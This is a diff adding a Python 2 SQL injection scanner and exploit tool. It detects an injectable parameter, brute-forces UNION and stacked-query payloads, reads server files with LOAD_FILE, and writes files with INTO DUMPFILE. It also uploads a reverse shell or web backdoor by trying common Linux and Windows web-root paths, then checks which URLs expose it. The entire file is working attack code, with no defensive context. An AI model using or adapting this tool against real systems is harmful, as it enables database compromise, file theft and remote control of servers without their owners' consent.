@@ -1,0 +1,483 @@
+#!/usr/bin/env python2
+# -*- coding: utf8 -*-
+import binascii
+import requests
+import urllib3
+urllib3.disable_warnings()
+import random
+import string
+import argparse
+import sys, os, re
+from termcolor import colored
+
+arg_parser = argparse.ArgumentParser(description='A sql injection scan and exploit script')
+arg_parser.add_argument('--data', dest='data', help='Data string to be sent through POST/GET\n Like "category=2&productId=1&productName=name" ', type=str, required=True)
+arg_parser.add_argument('-m', '--method', dest='method', help='Htp method to use for injection, set to POST by default', type=str, default="POST")
+arg_parser.add_argument("--file-dest", dest="remotepah", type=str, help="Back-end DBMS absolute filepath to write to")
+arg_parser.add_argument('--file-write', dest='localpath', help='Write a local file on the back-end DBMS file system', type=str)
+arg_parser.add_argument('--file-read', dest='pathtoread', help='Read a local file on the back-end DBMS file system', type=str)
+arg_parser.add_argument('--upload-revshell', dest='revshellpath', help='Upload a rev shell in the host. The script verify if rev-shell is accessible from outside', type=str)
+arg_parser.add_argument("-H", dest="header", type=str, help="One or multiple header for the request, separate with a space\nUse like 'key1:value1 key2:value2'")
+arg_parser.add_argument("-c", "--cookies", dest="cookies", type=str, help="One or multiple cookies values for the request, separate with a space\nUse like 'PHPSESSID=shuv7rnuv UserToken=yes'")
+arg_parser.add_argument('-u','--url', dest='url', help='The url to use for sqli', required=True, type=str)
+arg_parser.add_argument('-p','--parameter', dest='parameter', help='The injectable parameter', required=True, type=str)
+arg_parser.add_argument('-l','--level', dest='level', help='The level of the scan (l|h) "l" for little, and "h" for huge', default='l', type=str)
+arg_parser.add_argument('-v', '--verbose', dest='verbose', help='Define verbose output. set to False by default', type=str, default="FALSE")
+args = arg_parser.parse_args()
+
+# proxy set for test
+proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
+print("")
+# Gloabal vars
+TYPE= {}
+TYPE["sqli"]=0
+TYPE["filexist"]=1
+CREATEDFILEHASH=""
+FILESIZE=0
+SQLIHASH="qjkjTWyZfEABUbbkq"
+if args.revshellpath is not None:
+  if not os.path.isfile(args.revshellpath):
+    print colored('[ERROR] The file "'+args.revshellpath+'" does not exists', "red")
+    sys.exit(1)
+if args.localpath is not None:
+  if args.remotepah is None:
+    print colored('[ERROR] You have to define the destination filepath with the param "--file-dest" in the DBMS server', "red")
+    sys.exit(1)
+  elif not os.path.isfile(args.localpath):
+    print colored('[ERROR] The file "'+args.localpath+'" does not exists', "red")
+    sys.exit(1)
+  else:
+    FILESIZE=len(open(args.localpath,"r").read())+2  
+elif args.remotepah is not None:  
+       print colored('[ERROR] You have to define both "--file-dest" and "--file-write"', "red")
+       sys.exit(1)
+if args.revshellpath is not None:
+  if not os.path.isfile(args.revshellpath):
+    print colored('[ERROR] The file "'+args.revshellpath+'" does not exists', "red")
+    sys.exit(1)      
+if args.level.lower() in ('h', 'huge'):
+  SCAN_LEVEL= 21
+else:
+  SCAN_LEVEL= 11 
+if args.verbose.lower() in ('yes', 'true', 't', 'y', '1'):
+  VERBOSE= True
+else:
+  VERBOSE= False
+TARGET=args.url.split("//")[1].split("/")[0]
+HTTP=args.url.split("//")[0].split(":")[0]
+BRUTE_DOC_ROOT_PREFIXES = {
+    "linux": ("/var/www", "/usr/local/apache", "/usr/local/apache2", "/usr/local/www/apache22", "/usr/local/www/apache24", "/usr/local/httpd", "/var/www/nginx-default", "/srv/www", "/var/www/%TARGET%", "/var/www/vhosts/"+TARGET, "/var/www/virtual/"+TARGET, "/var/www/clients/vhosts/"+TARGET, "/var/www/clients/virtual/"+TARGET),
+    "windows": ("/xampp", "/Program Files/xampp", "/wamp", "/Program Files/wampp", "/apache", "/Program Files/Apache Group/Apache", "/Program Files/Apache Group/Apache2", "/Program Files/Apache Group/Apache2.2", "/Program Files/Apache Group/Apache2.4", "/Inetpub/wwwroot", "/Inetpub/wwwroot/"+TARGET, "/Inetpub/vhosts/"+TARGET)
+}
+# inject test
+INJECT_TEST = ("'","''","\"","\"\"","\\","\\\\")
+# Suffixes used in brute force search for web server document root
+BRUTE_DOC_ROOT_SUFFIXES = ("", "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "www", "data", "sites/all", "www/build")
+
+# SQLI brute force tempaltes
+SQLI_SELECT = ("name';SELECT ", "name';SELECT ", "name ;SELECT ", "name ;SELECT ", "-5314';SELECT ", "-5314';SELECT ", "-5314 ;SELECT ", "-5314 ;SELECT ")#
+SQLI_SELECT_UNION = ("-8408 UNION ALL SELECT ", "-8408' UNION ALL SELECT ", "name UNION ALL SELECT ", "name' UNION ALL SELECT ")#
+SQLI_COMMENT = ('#','/*','-- -','-- --',';%00','`')
+REQUEST= {}
+for param in args.data.split("&"):
+   key= param.split("=")[0].rstrip()
+   value = param.split("=")[1].rstrip()
+   REQUEST[key] = value
+# define header 
+HEADERS= {}
+if args.header is not None:
+  for header in args.header.split(" "):
+    key= header.split(":")[0].rstrip()
+    value = header.split(":")[1].rstrip()
+    HEADERS[key] = value
+
+# define header 
+COOKIES= {}
+if args.cookies is not None:
+  for cookie in args.cookies.split(" "):
+    key= cookie.split("=")[0].rstrip()
+    value = cookie.split("=")[1].rstrip()
+    COOKIES[key] = value
+# fct to output verbose
+def debug(msg):
+ if (VERBOSE):
+   print colored('[DEBUG] '+msg, "blue")
+
+#function to verify return request 
+def request_verify(request, verify,myhash,type):
+  output= request.content
+  if ( myhash in  output):
+    return True
+  if (type == 1): # if verify file exists
+    return False  
+  # if its a blind sqli let's see about return code  
+  if ("code_error" in verify.keys()):
+    if ( request.status_code == verify["success_code"]):
+      return True
+  if ("output" in verify.keys()):
+    if ( any(err in output.lower() for err in verify["output"]) ):
+      return False
+    elif (verify["content"] != request.headers['Content-Length']):
+      return True      
+  return False 
+
+#make a request
+def send_request():
+  if ( args.method.lower() == "get" ):
+    req=requests.post(args.url,allow_redirects=False,verify=False,params=REQUEST, headers=HEADERS, cookies=COOKIES,timeout=30)
+  else:
+    req=requests.post(args.url,allow_redirects=False,verify=False,data=REQUEST, headers=HEADERS, cookies=COOKIES,timeout=30)
+  return req  
+
+# upload a rev shell
+def upload_file(path,head,tail,hexadumpfile,revname):
+  if path[len(path)-1] != "/":
+     fpath= path+"/"+revname
+  else:
+    fpath= path+revname
+  write_sqlr= head+hexadumpfile+" INTO DUMPFILE '"+fpath+"' "+tail
+  debug("The sql request: "+write_sqlr)
+  REQUEST[args.parameter] = write_sqlr
+  req=send_request()
+  debug('The request data sent: '+str(REQUEST))
+  debug('The response code is: '+str(req.status_code)) 
+
+# verify that he rev shell is reachable from outside
+def found_revshell(path,revname,list_url):
+  if path[len(path)-1] != "/":
+    fpath= path+"/"+revname
+  else:
+    fpath= path+revname
+  nb=len(fpath.split("/"))
+  gurl=HTTP+"://"+TARGET+"/"
+  url=gurl+revname
+  debug('Test url: '+url)
+  resultat=requests.get(url,allow_redirects=False,verify=False,headers=HEADERS, cookies=COOKIES)
+  debug("The response code is:"+str(resultat.status_code))
+  if ( resultat.status_code == 200 and url not in list_url.keys() ) :
+    debug("Success. The rev shell uploaded in path "+fpath+" and you can access it at the url: "+url) 
+    list_url[url]=fpath 
+  else:  
+    for i in range(1,nb):
+      lurl=fpath.split("/",i)[len(fpath.split("/",i))-1]
+      url=gurl+lurl
+      debug('Test url: '+url)
+      resultat=requests.get(url,allow_redirects=False,verify=False,headers=HEADERS, cookies=COOKIES) 
+      debug("The response code is:"+str(resultat.status_code))
+      if ( resultat.status_code == 200 and url not in list_url.keys() ):
+        debug("Success. The rev shell uploaded in path "+fpath+" and you can access it at the url: "+url)  
+        list_url[url]=fpath
+
+# Verify if param injectable and define return error
+TYPE_VERIFY = {}
+req=send_request()  
+code=req.status_code
+TYPE_VERIFY["success_code"]= code
+TYPE_VERIFY["content"] = req.headers['Content-Length']
+debug('The request without injection return code: '+str(code))
+# try injections
+found = False
+errors = ['sql syntax', 'error:', 'syntax to use near', 'syntax error', 'cardinality violation', 'select statements']
+for inject in INJECT_TEST:
+  debug('Injection string: '+inject)
+  REQUEST[args.parameter] = inject
+  req=send_request() 
+  debug('The request data sent: '+str(REQUEST))
+  debug('The response code is: '+str(req.status_code))  
+  output = req.content.lower()
+  if (req.status_code != code or  any(err in output for err in errors) ):
+    if (req.status_code != code):
+       TYPE_VERIFY["code_error"] = req.status_code
+       found=True
+       break
+    else:
+       TYPE_VERIFY["output"] = errors
+       found=True
+       break
+if (found):
+  print colored('[SQLI] The parameter "'+args.parameter+'" is injectable', "green")
+  if ("code_error" in TYPE_VERIFY.keys()):
+    print colored('[SQLI] Blind injection use code error to analyse injection', "yellow")
+  else:
+    print colored('[SQLI] You can use the output errors to analyse the injection', "yellow")
+else:
+  print colored('[SQLI] The parameter "'+args.parameter+'" is not seems to be injectable', "red")
+  action="no"
+  action = raw_input("Do you want  continue trying anyway. 'No' by default: [y/n] ")
+  if action.lower() not in ('y','yes'):
+    sys.exit(1)
+
+## Found a sqli request with bruteforce
+head=""
+tail=""
+inject=""
+nb_colomns=0
+found = False
+#Use select union template
+for inject1 in SQLI_SELECT_UNION:
+  for inject2 in SQLI_COMMENT:
+    for i in range(1,41):
+       if (i == 1):
+         colomns="CONCAT(0x716a6b6a54,0x57795a66454142,0x5562626b71)"
+       else:
+         colomns+=","+"CONCAT(0x716a6b6a54,0x57795a66454142,0x5562626b71)"
+       inject=inject1+colomns+inject2
+       debug('Injection string used: '+inject)
+       REQUEST[args.parameter] = inject
+       req=send_request() 
+       debug('The request data sent: '+str(REQUEST))
+       debug('The response code is: '+str(req.status_code))  
+       found=request_verify(req,TYPE_VERIFY,SQLIHASH,TYPE["sqli"])
+       if found: 
+         debug('The injection works great: '+inject)
+         if (i == 1):
+           colomns_txt= ""
+         else:
+           nb_colomns=i
+           colomns_txt="0x20,"*(i-1)
+         colomns_txt+=" "
+         head_vrfy=inject1
+         head=inject1+colomns_txt
+         tail=inject2
+         break
+    if found:
+      break    
+  if found:
+    break
+if not found:
+  # use select template
+  for inject1 in SQLI_SELECT:
+    for inject2 in SQLI_COMMENT:
+      for i in range(1,SCAN_LEVEL):
+        if (i == 1):
+          colomns="CONCAT(0x716a6b6a54,0x57795a66454142,0x5562626b71)"
+        else:
+          colomns+=","+"CONCAT(0x716a6b6a54,0x57795a66454142,0x5562626b71)"
+        inject=inject1+colomns+inject2
+        debug('Injection string used: '+inject)
+        REQUEST[args.parameter] = inject
+        req=send_request() 
+        debug('The request data sent: '+str(REQUEST))
+        debug('The response code is: '+str(req.status_code))  
+        found=request_verify(req,TYPE_VERIFY,SQLIHASH,TYPE["sqli"])
+        if found: 
+          debug('The injection works great: '+inject)
+          head=head_vrfy=inject1
+          tail=inject2
+          break
+      if found:
+        break    
+    if found:
+      break
+if (found):
+  print colored('[Exploit] Found a sqli injection: '+REQUEST[args.parameter], "green") 
+  print colored('[Exploit] The Head: ('+head+') and the comment char: ('+tail+')', "green")
+else:     
+  print colored('[SQLI] The parameter "'+args.parameter+'" is not injectable', "red")
+  sys.exit(1)
+  
+# write a file in DBMS server
+if args.localpath is not None:
+  print colored('[Upload] Upload a file through sqli', "yellow")
+  debug('Local file: "'+args.localpath+'" and remote file: "'+args.remotepah+'"')
+  # read local file
+  hexdump=binascii.b2a_hex(open(args.localpath,"r").read())
+  hexadumpfile="0x0d0a"+hexdump
+  write_sqlr= head+hexadumpfile+" INTO DUMPFILE '"+args.remotepah+"' "+tail
+  debug("The sql request: "+write_sqlr)
+  REQUEST[args.parameter] = write_sqlr
+  req=send_request() 
+  debug('The request data sent: '+str(REQUEST))
+  debug('The response code is: '+str(req.status_code)) 
+  action="no"
+  action = raw_input("Do you want confirmation that the file '"+args.localpath+"' has been successfully written on the backend file system ('"+args.remotepah+"')?. 'No' by default: [y/n] ")
+  if action.lower()  in ('y','yes'):
+    #verify the size of the local uploaded file
+    verify_size="CONCAT(0x5562626b71,IFNULL(CAST(LENGTH(LOAD_FILE(0x"+binascii.hexlify(args.remotepah)+")) AS CHAR),0x20),0x5562626b71)"
+    if nb_colomns > 0:
+      colomns_txt=(verify_size+",")*(nb_colomns-1)+verify_size
+    else:
+      colomns_txt=verify_size
+    verify_sqlr=head_vrfy+colomns_txt+tail
+    debug("The sql request: "+verify_sqlr)
+    REQUEST[args.parameter] = verify_sqlr
+    req=send_request() 
+    debug('The request data sent: '+str(REQUEST))
+    debug('The response code is: '+str(req.status_code)) 
+    if nb_colomns > 0:
+      CREATEDFILEHASH="Ubbkq"+str(FILESIZE+nb_colomns-1)+"Ubbkq"
+    else:
+      CREATEDFILEHASH="Ubbkq"+str(FILESIZE)+"Ubbkq"
+    found=request_verify(req,TYPE_VERIFY,CREATEDFILEHASH,TYPE["filexist"])
+    if found:
+      print colored('[Upload] File has been successfully written on the backend ',"green")
+      print colored('[Upload] File verification: the local file "'+args.localpath+'" and the remote file "'+args.remotepah+'" have the same size ('+str(FILESIZE)+' B)', "green")
+    else:
+      print colored('[WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path',"red")
+      if ("code_error" in TYPE_VERIFY.keys()):
+        print colored('[WARNING] Sometimes due to output less script cant predict id the file is written in the DBMS. so think to verify it manually ',"yellow")
+#first treat upload file then readfile then  revshell if exist  
+# read file from DBMS
+if args.pathtoread is not None:
+  # verif if file exist in the server by the size
+  verify_size="CONCAT(0x5562626b71,IFNULL(CAST(LENGTH(LOAD_FILE(0x"+binascii.hexlify(args.pathtoread)+")) AS CHAR),0x20),0x5562626b71)"
+  if nb_colomns > 0:
+    colomns_txt=(verify_size+",")*(nb_colomns-1)+verify_size
+  else:
+    colomns_txt=verify_size
+  verify_sqlr=head_vrfy+colomns_txt+tail
+  debug("The sql request: "+verify_sqlr)
+  REQUEST[args.parameter] = verify_sqlr
+  req=send_request()
+  debug('The request data sent: '+str(REQUEST))
+  debug('The response code is: '+str(req.status_code)) 
+  found=request_verify(req,TYPE_VERIFY,"Ubbkq",TYPE["filexist"])
+  read_file=False
+  if found:
+    elems=re.findall(r"Ubbkq(\w+|\s+)Ubbkq", req.content)
+    if len(elems) > 0:
+      nbs=elems[0]
+      if (nbs != ' '):
+        if (nbs == '0'):
+          print colored('[Read] The file "'+args.pathtoread+'" exists but its empty ('+nbs+' B)',"yellow")
+        else:
+          print colored('[Read] The file "'+args.pathtoread+'" exists and it has the size ('+nbs+' B)',"green")
+          read_file=True 
+      else:
+        print colored('[Read] The file "'+args.pathtoread+'" doses not exists',"red")      
+    else:
+      action="no"
+      action = raw_input("The script does not find any output size for the path '"+args.pathtoread+"' do you want read the file anyway?. 'No' by default: [y/n] ")
+      if action.lower()  in ('y','yes'):
+        read_file=True
+  else:
+    action="no"
+    action = raw_input("The script does not find any output size for the path '"+args.pathtoread+"' do you want read the file anyway?. 'No' by default: [y/n] ")
+    if action.lower()  in ('y','yes'):
+      read_file=True 
+  # if we have to read file
+  if read_file:
+    found=False
+    #caught the response without any output, used toverify length 
+    read_sqlr1= head+"0x20"+tail
+    debug("The sql request: "+read_sqlr1)
+    REQUEST[args.parameter] = read_sqlr1
+    req=send_request()
+    debug('The request data sent: '+str(REQUEST))
+    debug('The response code is: '+str(req.status_code)) 
+    debug('The response lenght is: '+req.headers["Content-Length"])
+    r1_content=int(req.headers["Content-Length"])
+    if nb_colomns ==0:
+      rangenb=nb_colomns+2
+    else:
+      rangenb=nb_colomns+1    
+    for i in range(1,rangenb):
+      sql="0x20," *(i-1) +"LOAD_FILE(0x"+binascii.hexlify(args.pathtoread)+")"
+      if(i != nb_colomns and nb_colomns != 0):
+        sql+=","
+      if ( (nb_colomns-i-1) >= 0):
+        sql+="0x20,"*(nb_colomns-i-1)+"0x20"
+      REQUEST[args.parameter] = head_vrfy+sql+tail
+      req=send_request()  
+      debug('\tThe new request data sent: '+str(REQUEST))
+      r2_content= int(req.headers["Content-Length"])
+      debug('\tThe new response code is: '+str(req.status_code)) 
+      debug('\tThe new response lenght is: '+str(r2_content))
+      # verify the size of current request gt the previous (due select load_file() return)
+      if (r2_content >  r1_content):
+        randf= ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(8)])+"_"+args.pathtoread
+        tmpfile="/tmp/"+randf.replace("/","_")
+        ff=open(tmpfile,"w")
+        ff.write(req.content)
+        ff.close()
+        print colored('[Read] File readed successfully, it will be saved at he path: "'+tmpfile+'" ',"green")
+        found=True
+        break  
+  if not found:
+    print colored('[Read] The file "'+args.pathtoread+'" doses not exists, or DBMS does not have the right to read it',"red") 
+
+#rev shell to upload
+if args.revshellpath is not None:
+  # Default args
+  LIST_URLS={}
+  EXT=".php"
+  ARCH="all"
+  definedir=False
+  bruteforcedir=True
+  # read local revshell
+  hexdump=binascii.b2a_hex(open(args.revshellpath,"r").read())
+  hexadumpfile="0x0d0a"+hexdump
+  print colored('[Reverse Shell Upload] Upload a reverse shell file through sqli', "yellow")
+  print colored('[INFO] Going to use a web backdoor to establish the tunnel', "yellow")
+  print colored('which web application language does the web server support?', "white")
+  print colored('[1] ASP', "white")
+  print colored('[2] ASPX', "white")
+  print colored('[3] JSP', "white")
+  print colored('[4] PHP (default)', "white")
+  action = raw_input("> ")
+  if action.rstrip()  == '1':
+    EXT=".asp"
+  if action.rstrip()  == '2':
+    EXT=".aspx"
+  if action.rstrip()  == '3':  
+    EXT=".jsp"
+  # definethe rev shell name
+  revname=''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(12)])+EXT  
+  print colored('[Reverse Shell Upload] Define destination directory path', "yellow")
+  print colored('what do you want to use for writable directory?', "white")
+  print colored('[1] Define a locations(s) path(s)', "white")
+  print colored('[2] Brute force search (default)', "white")
+  action = raw_input("> ")
+  if action == '1':
+    definedir=True
+    bruteforcedir=False
+  if definedir:
+    action = raw_input("please provide a comma separate list of absolute directory paths:")
+    if re.search("\w+",action.rstrip()):
+      dirs=action.split(",")
+      for dir in dirs:
+        upload_file(dir,head,tail,hexadumpfile,revname)
+        found_revshell(dir,revname,LIST_URLS)
+      if len(LIST_URLS) == 0:
+          print colored('[Reverse Shell Upload] no accessible path found', "red")
+          action = raw_input("Do you want to try brute force? [y/n]: ")
+          if action.lower()  in ('y','yes'):
+            bruteforcedir= True
+    else:
+      print colored('[ERROR] no directory path entered!', "red")
+      sys.exit(1)
+  if bruteforcedir:
+    print colored('[Reverse Shell Upload] Define the DBMS server architecture', "yellow")
+    print colored('Choose the DBMS architecture?', "white")
+    print colored('[1] Windows', "white")
+    print colored('[2] Linux', "white")
+    print colored('[3] All (default)', "white")
+    action = raw_input("> ")
+    if action.rstrip() == '1':
+      ARCH="win"
+    if action.rstrip() == '2':
+      ARCH="lin"
+    if ARCH == "win" or ARCH == "all":
+      for path1 in BRUTE_DOC_ROOT_PREFIXES["windows"]:
+        for path2 in BRUTE_DOC_ROOT_SUFFIXES:     
+          if path2 != "":
+            path =path1+"/"+path2+"/"
+          else:
+            path =path1+"/"+path2
+          upload_file(path,head,tail,hexadumpfile,revname)
+          found_revshell(path,revname,LIST_URLS)
+    if ARCH == "lin" or ARCH == "all":
+      for path1 in BRUTE_DOC_ROOT_PREFIXES["linux"]:
+        for path2 in BRUTE_DOC_ROOT_SUFFIXES:     
+          if path2 != "":
+            path =path1+"/"+path2+"/"
+          else:
+            path =path1+"/"+path2
+          upload_file(path,head,tail,hexadumpfile,revname)
+          found_revshell(path,revname,LIST_URLS)      
+  if len(LIST_URLS) == 0:
+    print colored('[Reverse Shell Upload] no accessible path found', "red")
+  else:
+    print colored('[Reverse Shell Upload] The script found '+str(len(LIST_URLS))+' url(s)', "green")
+    for key in LIST_URLS.keys():
+      print colored('[URL] Try your reverse shell in the url: '+key+' uploaded in the DBMS path "'+LIST_URLS[key]+'"', "yellow")
